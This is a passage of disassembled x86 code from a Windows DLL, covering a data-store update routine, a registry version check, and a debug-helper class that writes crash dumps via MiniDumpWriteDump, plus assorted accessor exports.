		push	offset aCdatastoreUp_4 ; "CDataStore::Update() : WriteIndex() == "...
		jmp	short loc_6AF41FDD
; ---------------------------------------------------------------------------

loc_6AF41FD8:				; CODE XREF: Ordinal591+22j
					; Ordinal591+2Bj ...
		push	offset aCdatastoreUp_5 ; "CDataStore::Update() : dwSize	= 0\n"

loc_6AF41FDD:				; CODE XREF: Ordinal591+63j
					; Ordinal591+72j ...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi

loc_6AF41FE5:				; CODE XREF: Ordinal591+ABj
		lea	ecx, [ebp+var_1C]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal591	endp

; Exported entry 623.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=1ACh

		public Ordinal623
Ordinal623	proc near		; CODE XREF: Ordinal446+Ep
					; DATA XREF: .rdata:off_6AF66098o

var_22C		= byte ptr -22Ch
cbData		= dword	ptr -220h
var_21C		= dword	ptr -21Ch
var_218		= dword	ptr -218h
var_214		= dword	ptr -214h
var_210		= dword	ptr -210h
Dst		= byte ptr -20Ch
var_108		= byte ptr -108h
var_4		= dword	ptr -4

		push	ebp
		lea	ebp, [esp-1ACh]
		sub	esp, 22Ch
		mov	eax, ___security_cookie
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [ebp+1ACh+var_108]
		mov	[ebp+1ACh+var_4], eax
		mov	dword ptr [esi], offset	off_6AF5BCF4
		mov	dword ptr [esi+4], 3
		call	Ordinal932
		xor	edi, edi
		inc	edi
		push	edi
		lea	ecx, [ebp+1ACh+var_108]
		call	Ordinal941
		test	eax, eax
		jnz	loc_6AF4211B
		push	edi
		lea	ecx, [ebp+1ACh+var_108]
		call	Ordinal944
		test	eax, eax
		jnz	loc_6AF4211B
		push	ebx
		lea	ecx, [ebp+1ACh+var_22C]
		mov	dword ptr [esi+4], 2
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	20019h		; samDesired
		push	offset aClsidBdc678904 ; "CLSID\\{bdc67890-4fc0-11d0-a805-00aa006d"...
		push	80000000h	; hKey
		lea	ecx, [ebp+1ACh+var_22C]
		call	Ordinal993
		test	eax, eax
		jz	loc_6AF42110
		mov	edi, 104h
		push	edi		; Size
		lea	eax, [ebp+1ACh+Dst]
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+1ACh+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+1ACh+Dst]
		push	eax		; lpData
		push	offset dword_6AF5BCB0 ;	lpValueName
		lea	ecx, [ebp+1ACh+var_22C]
		mov	[ebp+1ACh+cbData], edi
		call	Ordinal1002
		test	eax, eax
		jz	short loc_6AF42110
		lea	eax, [ebp+1ACh+var_21C]
		push	eax
		lea	eax, [ebp+1ACh+var_210]
		push	eax
		lea	eax, [ebp+1ACh+var_218]
		push	eax
		lea	eax, [ebp+1ACh+var_214]
		push	eax
		lea	eax, [ebp+1ACh+Dst]
		push	offset aDDDD	; "%d,%d,%d,%d"
		push	eax		; Src
		mov	[ebp+1ACh+var_21C], ebx
		mov	[ebp+1ACh+var_210], ebx
		mov	[ebp+1ACh+var_218], ebx
		mov	[ebp+1ACh+var_214], ebx
		call	ds:sscanf
		add	esp, 18h
		cmp	eax, 4
		jnz	short loc_6AF42110
		cmp	[ebp+1ACh+var_214], eax
		jg	short loc_6AF42109
		jnz	short loc_6AF42110
		cmp	[ebp+1ACh+var_218], 47h
		jg	short loc_6AF42109
		jnz	short loc_6AF42110
		cmp	[ebp+1ACh+var_210], ebx
		jg	short loc_6AF42109
		jnz	short loc_6AF42110
		cmp	[ebp+1ACh+var_21C], 0D00h
		jl	short loc_6AF42110

loc_6AF42109:				; CODE XREF: Ordinal623+F7j
					; Ordinal623+FFj ...
		mov	dword ptr [esi+4], 1

loc_6AF42110:				; CODE XREF: Ordinal623+8Cj
					; Ordinal623+BFj ...
		lea	ecx, [ebp+1ACh+var_22C]
		call	Ordinal990
		pop	ebx
		jmp	short loc_6AF4211E
; ---------------------------------------------------------------------------

loc_6AF4211B:				; CODE XREF: Ordinal623+46j
					; Ordinal623+5Aj
		mov	[esi+4], edi

loc_6AF4211E:				; CODE XREF: Ordinal623+123j
		lea	ecx, [ebp+1ACh+var_108]
		call	Ordinal933
		mov	ecx, [ebp+1ACh+var_4]
		pop	edi
		mov	eax, esi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		add	ebp, 1ACh
		leave
		retn
Ordinal623	endp

; Exported entry 624.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal624
Ordinal624	proc near		; CODE XREF: Ordinal446+21p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5BCF4
		retn
Ordinal624	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_6. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF42164	proc near		; CODE XREF: sub_6AF422CC+16Dp

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
arg_0		= dword	ptr  8

		push	10h
		push	offset stru_6AF5BCF8
		call	__SEH_prolog
		xor	eax, eax
		inc	eax
		and	[ebp+ms_exc.disabled], 0
		mov	edx, [ebp+arg_0]
		mov	ecx, [edx]
		mov	[ebp+var_1C], ecx
		cmp	byte ptr [ecx-5], 0E8h
		jnz	short loc_6AF4218C
		add	ecx, 0FFFFFFFBh

loc_6AF42188:				; CODE XREF: sub_6AF42164+31j
		mov	[edx], ecx
		jmp	short loc_6AF421A7
; ---------------------------------------------------------------------------

loc_6AF4218C:				; CODE XREF: sub_6AF42164+1Fj
		cmp	byte ptr [ecx-6], 0FFh
		jnz	short loc_6AF42197
		add	ecx, 0FFFFFFFAh
		jmp	short loc_6AF42188
; ---------------------------------------------------------------------------

loc_6AF42197:				; CODE XREF: sub_6AF42164+2Cj
		xor	eax, eax
		mov	[ebp+var_20], eax
		jmp	short loc_6AF421A7
; ---------------------------------------------------------------------------

loc_6AF4219E:				; DATA XREF: .rdata:stru_6AF5BCF8o
		xor	eax, eax	; Exception filter 0 for function 6AF42164
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF421A2:				; DATA XREF: .rdata:stru_6AF5BCF8o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF42164
		xor	eax, eax

loc_6AF421A7:				; CODE XREF: sub_6AF42164+26j
					; sub_6AF42164+38j
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		call	__SEH_epilog
		retn
sub_6AF42164	endp

; Exported entry 626.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal626
Ordinal626	proc near		; CODE XREF: Ordinal560+51p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		mov	dword ptr [esi], offset	off_6AF5BD04
		mov	eax, esi
		pop	esi
		retn
Ordinal626	endp

; Exported entry 631.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal631
Ordinal631	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF421D6
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF421FF

loc_6AF421D6:				; CODE XREF: Ordinal631+8j
		push	edi
		xor	edi, edi
		inc	edi
		cmp	[esp+8+arg_0], 0
		jnz	short loc_6AF421E7
		and	dword ptr [esi+8], 0
		jmp	short loc_6AF421FC
; ---------------------------------------------------------------------------

loc_6AF421E7:				; CODE XREF: Ordinal631+1Cj
		push	offset Args	; "MiniDumpWriteDump"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF421FC
		xor	edi, edi

loc_6AF421FC:				; CODE XREF: Ordinal631+22j
					; Ordinal631+35j
		mov	eax, edi
		pop	edi

loc_6AF421FF:				; CODE XREF: Ordinal631+11j
		pop	esi
		retn	4
Ordinal631	endp

; Exported entry 634.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal634(LPCSTR Args,	int, int)
		public Ordinal634
Ordinal634	proc near		; CODE XREF: Ordinal564+250p
					; sub_6AF422CC+1DEp
					; DATA XREF: ...

var_18		= byte ptr -18h
Dst		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
Args		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		cmp	[esi+8], edi
		jnz	short loc_6AF42226
		push	offset aCdebughelpDump ; "CDebugHelp::Dump() : MiniDumpWriteDump "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF422C6
; ---------------------------------------------------------------------------

loc_6AF42226:				; CODE XREF: Ordinal634+Fj
		lea	ecx, [ebp+var_18]
		call	Ordinal768
		push	edi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	edi		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_18]
		call	Ordinal773
		test	eax, eax
		jnz	short loc_6AF42259
		push	offset aCdebughelpDu_0 ; "CDebugHelp::Dump() : dumpFile.Open() =="...
		call	sub_6AF3102E

loc_6AF42256:				; CODE XREF: Ordinal634+B4j
		pop	ecx
		jmp	short loc_6AF422BC
; ---------------------------------------------------------------------------

loc_6AF42259:				; CODE XREF: Ordinal634+47j
		push	0Ch		; Size
		lea	eax, [ebp+Dst]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		call	ds:GetCurrentThreadId
		mov	[ebp+Dst], eax
		mov	eax, [ebp+arg_8]
		push	edi
		mov	[ebp+var_8], eax
		push	edi
		lea	eax, [ebp+Dst]
		push	eax
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_18]
		mov	[ebp+var_4], 1
		call	Ordinal1118
		push	eax
		call	ds:GetCurrentProcessId
		push	eax
		call	ds:GetCurrentProcess
		push	eax
		call	dword ptr [esi+8]
		test	eax, eax
		jnz	short loc_6AF422B9
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCdebughelpDu_1 ; "CDebugHelp::Dump() : MiniDumpWriteDump("...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF42256
; ---------------------------------------------------------------------------

loc_6AF422B9:				; CODE XREF: Ordinal634+A0j
		xor	edi, edi
		inc	edi

loc_6AF422BC:				; CODE XREF: Ordinal634+54j
		lea	ecx, [ebp+var_18]
		call	Ordinal770
		mov	eax, edi

loc_6AF422C6:				; CODE XREF: Ordinal634+1Ej
		pop	edi
		pop	esi
		leave
		retn	0Ch
Ordinal634	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF422CC(int,	LPCSTR Args, int)
sub_6AF422CC	proc near		; CODE XREF: Ordinal635+9p

var_5FC		= byte ptr -5FCh
var_5F0		= dword	ptr -5F0h
var_5AC		= dword	ptr -5ACh
var_5A8		= dword	ptr -5A8h
var_5A4		= dword	ptr -5A4h
var_5A0		= dword	ptr -5A0h
var_510		= dword	ptr -510h
var_50C		= dword	ptr -50Ch
var_508		= dword	ptr -508h
var_504		= dword	ptr -504h
var_500		= dword	ptr -500h
var_4FC		= dword	ptr -4FCh
var_4F8		= dword	ptr -4F8h
var_4F4		= dword	ptr -4F4h
var_4F0		= dword	ptr -4F0h
var_4EC		= dword	ptr -4ECh
var_4E8		= dword	ptr -4E8h
var_4E0		= dword	ptr -4E0h
var_4D8		= dword	ptr -4D8h
var_4D4		= dword	ptr -4D4h
Dst		= dword	ptr -2D0h
var_244		= dword	ptr -244h
var_240		= dword	ptr -240h
var_23C		= dword	ptr -23Ch
var_238		= dword	ptr -238h
var_234		= dword	ptr -234h
var_230		= dword	ptr -230h
var_22C		= dword	ptr -22Ch
var_228		= dword	ptr -228h
var_224		= dword	ptr -224h
var_220		= dword	ptr -220h
var_21C		= dword	ptr -21Ch
var_218		= dword	ptr -218h
var_214		= dword	ptr -214h
var_208		= dword	ptr -208h
var_0		= dword	ptr  0
arg_0		= dword	ptr  8
Args		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 5FCh
		mov	[ebp+var_4EC], eax
		mov	[ebp+var_4F8], ebx
		mov	[ebp+var_4F0], ecx
		mov	[ebp+var_4F4], edx
		mov	[ebp+var_500], edi
		mov	[ebp+var_4FC], esi
		xor	eax, eax
		mov	ax, gs
		mov	[ebp+var_510], eax
		mov	ax, fs
		mov	[ebp+var_50C], eax
		mov	ax, es
		mov	[ebp+var_508], eax
		mov	ax, ds
		mov	[ebp+var_504], eax
		mov	ax, cs
		mov	[ebp+var_4E0], eax
		mov	ax, ss
		mov	[ebp+var_4D4], eax
		mov	eax, [ebp+var_0]
		mov	[ebp+var_4E8], eax
		mov	eax, ebp
		add	eax, 8
		mov	[ebp+var_4D8], eax
		push	esi
		push	edi
		push	ebx
		push	ecx
		push	edx
		push	2CCh		; Size
		xor	esi, esi
		lea	eax, [ebp+Dst]
		push	esi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+Dst]
		push	eax		; lpContext
		mov	[ebp+Dst], 1003Fh
		call	ds:GetCurrentThread
		push	eax		; hThread
		call	ds:GetThreadContext
		cmp	eax, esi
		mov	[ebp+var_5A0], eax
		jz	loc_6AF424B5
		mov	eax, [ebp+var_4EC]
		mov	[ebp+var_220], eax
		mov	eax, [ebp+var_4F8]
		mov	[ebp+var_22C], eax
		mov	eax, [ebp+var_4F0]
		mov	[ebp+var_224], eax
		mov	eax, [ebp+var_4F4]
		mov	[ebp+var_228], eax
		mov	eax, [ebp+var_500]
		mov	[ebp+var_234], eax
		mov	eax, [ebp+var_4FC]
		mov	[ebp+var_230], eax
		mov	eax, [ebp+var_510]
		mov	[ebp+var_244], eax
		mov	eax, [ebp+var_50C]
		mov	[ebp+var_240], eax
		mov	eax, [ebp+var_508]
		mov	[ebp+var_23C], eax
		mov	eax, [ebp+var_504]
		mov	[ebp+var_238], eax
		mov	eax, [ebp+var_4E0]
		mov	[ebp+var_214], eax
		mov	eax, [ebp+var_4D4]
		mov	[ebp+var_208], eax
		mov	eax, [ebp+var_4E8]
		mov	[ebp+var_21C], eax
		mov	eax, [ebp+4]
		mov	[ebp+var_5A4], eax
		lea	eax, [ebp+var_5A4]
		push	eax
		call	sub_6AF42164
		cmp	eax, esi
		pop	ecx
		mov	[ebp+var_5A0], eax
		jz	short loc_6AF424B5
		mov	eax, [ebp+var_5A4]
		push	50h		; Size
		mov	[ebp+var_218], eax
		lea	eax, [ebp+var_5FC]
		push	esi		; Val
		push	eax		; Dst
		call	memset
		push	8		; Size
		lea	eax, [ebp+var_5AC]
		push	esi		; Val
		push	eax		; Dst
		call	memset
		mov	eax, [ebp+var_218]
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_5F0], eax
		lea	eax, [ebp+Dst]
		mov	[ebp+var_5A8], eax
		lea	eax, [ebp+var_5FC]
		add	esp, 18h
		mov	[ebp+var_5AC], eax
		lea	eax, [ebp+var_5AC]
		push	eax		; int
		push	[ebp+arg_8]	; int
		push	[ebp+Args]	; Args
		call	Ordinal634
		mov	[ebp+var_5A0], eax

loc_6AF424B5:				; CODE XREF: sub_6AF422CC+BBj
					; sub_6AF422CC+17Bj
		pop	edx
		pop	ecx
		pop	ebx
		pop	edi
		pop	esi
		mov	eax, [ebp+var_5A0]
		mov	esp, ebp
		pop	ebp
		retn
sub_6AF422CC	endp

; Exported entry 628.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal628(LPCSTR Args)
		public Ordinal628
Ordinal628	proc near		; CODE XREF: Ordinal632+13p
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF424DF
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF424E3

loc_6AF424DF:				; CODE XREF: Ordinal628+Ej
		xor	eax, eax
		jmp	short loc_6AF424FF
; ---------------------------------------------------------------------------

loc_6AF424E3:				; CODE XREF: Ordinal628+19j
		push	edi
		xor	edi, edi
		push	offset Args	; "MiniDumpWriteDump"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF424FC
		xor	edi, edi

loc_6AF424FC:				; CODE XREF: Ordinal628+34j
		mov	eax, edi
		pop	edi

loc_6AF424FF:				; CODE XREF: Ordinal628+1Dj
		pop	esi
		retn	4
Ordinal628	endp

; Exported entry 629.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal629(LPCSTR Args,	DWORD dwFlags)
		public Ordinal629
Ordinal629	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF42522
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF42526

loc_6AF42522:				; CODE XREF: Ordinal629+12j
		xor	eax, eax
		jmp	short loc_6AF42542
; ---------------------------------------------------------------------------

loc_6AF42526:				; CODE XREF: Ordinal629+1Dj
		push	edi
		xor	edi, edi
		push	offset Args	; "MiniDumpWriteDump"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4253F
		xor	edi, edi

loc_6AF4253F:				; CODE XREF: Ordinal629+38j
		mov	eax, edi
		pop	edi

loc_6AF42542:				; CODE XREF: Ordinal629+21j
		pop	esi
		retn	8
Ordinal629	endp

; Exported entry 635.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal635(int, LPCSTR	Args, int)
		public Ordinal635
Ordinal635	proc near		; CODE XREF: Ordinal564+234p
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]	; int
		push	[esp+4+Args]	; Args
		push	ecx		; int
		call	sub_6AF422CC
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4256A
		push	offset aCdebughelpSnap ; "CDebugHelp::Snap() : DumpWithContext() "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF4256D
; ---------------------------------------------------------------------------

loc_6AF4256A:				; CODE XREF: Ordinal635+13j
		xor	eax, eax
		inc	eax

locret_6AF4256D:			; CODE XREF: Ordinal635+22j
		retn	8
Ordinal635	endp

; Exported entry 627.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal627
Ordinal627	proc near		; CODE XREF: Ordinal561+2Fp
					; sub_6AF425A4+3p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5BD04
		call	Ordinal898
		mov	ecx, esi
		pop	esi
		jmp	Ordinal891
Ordinal627	endp

; Exported entry 632.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal632
Ordinal632	proc near		; CODE XREF: Ordinal562+41p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+8], 0
		call	Ordinal898
		push	offset aDbghelp_dll ; "DBGHELP.DLL"
		mov	ecx, esi
		call	Ordinal628
		pop	esi
		retn
Ordinal632	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF425A4(void *, char)
sub_6AF425A4	proc near		; DATA XREF: .rdata:off_6AF5BD04o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal627
		test	[esp+4+arg_0], 1
		jz	short loc_6AF425BA
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF425BA:				; CODE XREF: sub_6AF425A4+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF425A4	endp

; Exported entry 649.
; Exported entry 756.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal649
Ordinal649	proc near		; CODE XREF: Ordinal149+22p
					; Ordinal149+D0p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0] ; ccL30_649
		mov	[ecx+4], eax
		retn	4
Ordinal649	endp

; Exported entry 651.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal651
Ordinal651	proc near		; CODE XREF: Ordinal149+72p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+2Ch], eax
		retn	4
Ordinal651	endp

; Exported entry 534.
; Exported entry 652.
; Exported entry 1177.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal534
Ordinal534	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+2Ch]	; ccL30_534
					; ccL30_652
		retn
Ordinal534	endp

; Exported entry 653.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal653
Ordinal653	proc near		; CODE XREF: Ordinal149+4Ap
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+1Ch], eax
		retn	4
Ordinal653	endp

; Exported entry 655.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal655
Ordinal655	proc near		; CODE XREF: Ordinal149+54p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+20h], eax
		retn	4
Ordinal655	endp

; Exported entry 656.
; Exported entry 1174.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1174
Ordinal1174	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+20h]	; ccL30_656
		retn
Ordinal1174	endp

; Exported entry 657.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal657
Ordinal657	proc near		; CODE XREF: Ordinal149+5Ep
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+24h], eax
		retn	4
Ordinal657	endp

; Exported entry 658.
; Exported entry 1175.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal658
Ordinal658	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+24h]	; ccL30_658
		retn
Ordinal658	endp

; Exported entry 659.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal659
Ordinal659	proc near		; CODE XREF: Ordinal149+68p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+28h], eax
		retn	4
Ordinal659	endp

; Exported entry 305.
; Exported entry 660.
; Exported entry 917.
; Exported entry 1176.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1176
Ordinal1176	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+28h]	; ccL30_305
					; ccL30_660
					; ccL30_917
		retn
Ordinal1176	endp

; Exported entry 661.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal661
Ordinal661	proc near		; CODE XREF: Ordinal149+2Cp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+10h], eax
		retn	4
Ordinal661	endp

; Exported entry 304.
; Exported entry 365.
; Exported entry 662.
; Exported entry 766.
; Exported entry 911.
; Exported entry 916.
; Exported entry 1170.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal766
Ordinal766	proc near		; CODE XREF: Ordinal562+B3p
					; Ordinal564+D2p ...
		mov	eax, [ecx+10h]	; ccL30_304
					; ccL30_365
					; ccL30_662
					; ccL30_766
					; ccL30_911
					; ccL30_916
		retn
Ordinal766	endp

; Exported entry 663.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal663
Ordinal663	proc near		; CODE XREF: Ordinal149+36p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+14h], eax
		retn	4
Ordinal663	endp

; Exported entry 664.
; Exported entry 759.
; Exported entry 1171.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1171
Ordinal1171	proc near		; CODE XREF: Ordinal148+137p
					; Ordinal562+A7p ...
		mov	eax, [ecx+14h]	; ccL30_664
					; ccL30_759
		retn
Ordinal1171	endp

; Exported entry 671.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal671
Ordinal671	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+54h], eax
		retn	4
Ordinal671	endp

; Exported entry 672.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal672
Ordinal672	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+54h]
		retn
Ordinal672	endp

; Exported entry 673.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal673
Ordinal673	proc near		; CODE XREF: Ordinal640+33p
					; Ordinal641+10p ...

arg_0		= dword	ptr  4

		jmp	short loc_6AF4263A
; ---------------------------------------------------------------------------

loc_6AF42638:				; CODE XREF: Ordinal673+9j
		mov	ecx, eax

loc_6AF4263A:				; CODE XREF: Ordinal673j
		mov	eax, [ecx+54h]
		test	eax, eax
		jnz	short loc_6AF42638
		mov	ecx, [ecx+4]
		test	ecx, ecx
		jz	short loc_6AF42651
		cmp	ecx, [esp+arg_0]
		jg	short loc_6AF42651
		inc	eax
		jmp	short locret_6AF42653
; ---------------------------------------------------------------------------

loc_6AF42651:				; CODE XREF: Ordinal673+10j
					; Ordinal673+16j
		xor	eax, eax

locret_6AF42653:			; CODE XREF: Ordinal673+19j
		retn	4
Ordinal673	endp

; Exported entry 674.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal674
Ordinal674	proc near		; CODE XREF: Ordinal636+46p
					; Ordinal637+47p
					; DATA XREF: ...

var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF5BDF8
		call	__SEH_prolog
		mov	esi, ecx
		mov	[ebp+var_1C], esi
		cmp	dword ptr [esi+4Ch], 0
		jz	short loc_6AF42672
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4269E
; ---------------------------------------------------------------------------

loc_6AF42672:				; CODE XREF: Ordinal674+15j
		and	[ebp+ms_exc.disabled], 0
		lea	eax, [esi+34h]
		push	eax		; lpCriticalSection
		call	ds:InitializeCriticalSection
		mov	dword ptr [esi+4Ch], 1
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_6AF4269B
; ---------------------------------------------------------------------------

loc_6AF4268D:				; DATA XREF: .rdata:stru_6AF5BDF8o
		xor	eax, eax	; Exception filter 0 for function 6AF42656
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF42691:				; DATA XREF: .rdata:stru_6AF5BDF8o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF42656
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	esi, [ebp+var_1C]

loc_6AF4269B:				; CODE XREF: Ordinal674+35j
		mov	eax, [esi+4Ch]

loc_6AF4269E:				; CODE XREF: Ordinal674+1Aj
		call	__SEH_epilog
		retn
Ordinal674	endp

; Exported entry 675.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal675
Ordinal675	proc near		; CODE XREF: Ordinal153+3p
					; Ordinal154+3p ...

ms_exc		= CPPEH_RECORD ptr -18h

		push	8
		push	offset stru_6AF5BE08
		call	__SEH_prolog
		cmp	dword ptr [ecx+4Ch], 0
		jz	short loc_6AF426D8
		and	[ebp+ms_exc.disabled], 0
		add	ecx, 34h
		push	ecx		; lpCriticalSection
		call	ds:EnterCriticalSection
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF426DA
; ---------------------------------------------------------------------------

loc_6AF426CD:				; DATA XREF: .rdata:stru_6AF5BE08o
		xor	eax, eax	; Exception filter 0 for function 6AF426A4
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF426D1:				; DATA XREF: .rdata:stru_6AF5BE08o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF426A4
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh

loc_6AF426D8:				; CODE XREF: Ordinal675+10j
		xor	eax, eax

loc_6AF426DA:				; CODE XREF: Ordinal675+27j
		call	__SEH_epilog
		retn
Ordinal675	endp

; Exported entry 676.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal676
Ordinal676	proc near		; CODE XREF: Ordinal153+1Ep
					; Ordinal154+2Fp ...
		cmp	dword ptr [ecx+4Ch], 0
		jz	short locret_6AF426F0
		add	ecx, 34h
		push	ecx		; lpCriticalSection
		call	ds:LeaveCriticalSection

locret_6AF426F0:			; CODE XREF: Ordinal676+4j
		retn
Ordinal676	endp

; Exported entry 670.
; Exported entry 691.
; Exported entry 763.
; Exported entry 865.
; Exported entry 866.
; Exported entry 879.
; Exported entry 913.
; Exported entry 1136.
; Exported entry 1169.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal865
Ordinal865	proc near		; CODE XREF: Ordinal171+87p
					; Ordinal280+85p ...
		mov	eax, [ecx+0Ch]	; ccL30_670
